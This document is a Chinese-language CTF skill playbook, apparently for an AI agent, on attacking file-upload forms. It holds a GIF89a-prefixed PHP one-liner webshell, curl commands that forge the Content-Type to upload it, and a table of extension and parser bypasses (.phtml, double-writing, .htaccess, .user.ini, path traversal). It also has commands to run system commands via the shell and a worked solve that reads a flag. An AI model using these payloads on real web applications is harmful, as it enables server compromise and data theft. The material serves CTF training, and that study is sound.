---
name: ctf-web-upload
description: CTF 文件上传 攻击 playbook。识别/触发：文件上传/file upload/上传点/<input type=file>/MIME伪造/Content-Type伪造/GIF89a魔术头/.php后缀绕过/双写/点空点/.htaccess/.user.ini/getimagesize弱校验/白名单黑名单/webshell/一句话。碰到表单带文件上传、提示"前端验证vs后端验证"、上传后落盘路径可预测、需要传 webshell 拿 RCE 等指纹时，由二级 ctf-web 路由表调用本 leaf，专项解决"这个上传考点怎么打"。
---

# CTF 文件上传 解题 playbook

> **定位**：CTF skill 树三级 leaf（知识锚点）。由二级 `ctf-web` 路由表按识别特征调用；本文件只讲"文件上传怎么绕、怎么拿 RCE"，不重复工作流。
> **CTF 原则**：拿 flag 即止、不写修复、不臆想、区分确认与推测。

## 识别特征（什么时候调我）

- 页面有 `<form enctype="multipart/form-data">` + `<input type="file">`，或抓包见 `Content-Disposition: ... filename=`
- 题面提示"前端验证 vs 后端验证""MIME 可以伪造""只允许上传图片"
- 上传后回显落盘路径（`uploads/xxx.php`），路径/文件名可预测
- 目标是传 webshell 拿 RCE（与 ctf-web-cmdi 串联）

## 核心攻击手法

上传绕过的本质是**绕过校验层**——分清校验的是 **Content-Type / 扩展名 / 文件内容（魔术头/getimagesize/finfo）/ 后缀黑名单** 哪一层，逐层对症下药。

### 1. MIME（Content-Type）伪造——最常见，先试

后端只信 `$_FILES['x']['type']`（即请求头，客户端可控）时，curl `-F` 直接伪造：

```bash
printf 'GIF89a<?php system($_GET["c"]); ?>' > shell.php
curl -s -X POST "$T/" \
  -F "userfile=@shell.php;type=image/gif;filename=shell.php" \
  -F "submit=上传"
```

`type=image/gif` 伪造 Content-Type，`.php` 扩展名原样保留 → 后端过 MIME 校验、Apache 当 PHP 解析。

### 2. 内容检测绕过（魔术头 / getimagesize / finfo）

- **GIF 魔术头**前置 `GIF89a`：骗基于魔术头的弱检测 + `getimagesize()`（本题实际常未启用，作防御性双保险）
- **真图片马**：`copy normal.jpg/b + shell.php/a m.jpg`，配合文件包含（`ctf-web-lfi`）或解析漏洞触发
- **绕 getimagesize**：它只校验头几个字节，前置合法图片头即可

### 3. 扩展名绕过（黑名单场景）

| 过滤 | 绕过 |
|---|---|
| 禁 `.php` | `.php5 .phtml .pht .phps .phar`（看 Apache 配置 AddType） |
| 大小写 | `.PhP .pHp` |
| 双写 | `.pphphp`（过滤掉中间 php 后还剩 php） |
| 点空点 | `.php. .php .php::$DATA`(Windows) |
| `.htaccess` | 传 `.htaccess`：`AddType application/x-httpd-php .jpg`，再传 jpg 马 |
| `.user.ini` | `auto_prepend_file=shell.jpg`（PHP，需目录有 index.php 且重启周期） |

### 4. 白名单场景（只允许图片）

- 图片马 + 文件包含 / 解析漏洞（Apache 多后缀 `x.php.jpg`、Nginx `x.jpg/a.php`、CGI pathinfo）
- 服务器解析漏洞优先查框架/版本

### 5. 文件名可控 / 路径穿越

- filename 注入 `../../var/www/html/shell.php`（绕保存目录）
- 随机名 → 看回显 / 目录爆破（`ctf-web` 阶段1 侦察）

## CTF 实战结晶

**PHP文件上传（GZCTF / TopSecCTF，已确认）**——MIME 伪造 + GIF89a 直传 `.php` → RCE：

- 目标 Apache 2.4.25 + PHP 5.6.40，表单只让传 GIF。
- 判定：提示"MIME 可伪造 / 前端 vs 后端"→ **后端只校验 Content-Type**，前端 JS 校验对 curl 无效，忽略。
- 构造：`printf 'GIF89a<?php system($_GET["c"]); ?>' > shell.php`（GIF89a 双保险 + 一句话）。
- 上传：`curl -F "userfile=@shell.php;type=image/gif;filename=shell.php"` → 落盘 `uploads/shell.php`。
- RCE 确认：`?c=id` → `uid=33(www-data)`。
- 定位 flag：`?c=ls+-la+/var/www/html` 见 `flag.php`；`?c=cat+/var/www/html/flag.php` → `flag{bf4b2952-...}`。
- **flag 布局规律**：`GZCTF_FLAG` 环境变量 → entrypoint 写入 `flag.php`。命令执行后优先 `env`/`printenv` 直读环境变量，其次 `cat flag.php`。

## 工具命令

```bash
# 一句话 webshell（GET 触发）
printf 'GIF89a<?php system($_GET["c"]); ?>' > shell.php
# 伪造 MIME 直传
curl -s -X POST "$T/" -F "userfile=@shell.php;type=image/gif;filename=shell.php" -F "submit=上传"
# 触发 RCE
curl -s "$T/uploads/shell.php?c=id"
curl -s "$T/uploads/shell.php?c=env"            # 环境变量 flag
curl -s "$T/uploads/shell.php?c=ls+-la+/var/www/html"
```

## 深度参考（穷尽技巧时加载）

- hack-skills-main/skills/upload-insecure-files/SKILL.md —— 完整上传绕过矩阵、解析漏洞、真实 CVE

## 关联 leaf

- `ctf-web-cmdi`：上传拿 RCE 后即进入命令注入/flag 定位（同 file-upload-lfi 题，ping.php %0a 是另一条线）
- `ctf-web-lfi`：白名单/图片马场景靠文件包含触发；同题 `you_find_upload.php` 的 `?p=` 即 LFI 点
- `ctf-web-sqli` / `ctf-web-deser`：上传常作链路一环（写文件触发反序列化等）
